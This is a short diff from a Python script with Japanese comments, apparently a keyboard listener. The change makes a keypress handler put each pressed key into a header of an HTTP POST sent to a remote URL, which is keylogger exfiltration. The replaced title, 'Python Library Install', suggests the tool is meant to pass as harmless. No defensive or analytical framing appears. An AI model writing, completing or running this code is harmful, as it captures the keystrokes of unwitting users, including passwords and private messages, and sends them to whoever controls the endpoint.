@@ -18,7 +18,7 @@ def on_press(key):
         key_a = key
     # curl -d "Hi" と同じ設定（テキストデータをPOSTする）
     headers = {
-        "Title": "Python Library Install", # 通知のタイトル（任意）
+        "Title": str(key_a), # 通知のタイトル（任意）
     }
     response = requests.post(url, data="Push Key", headers=headers, timeout=5)
 
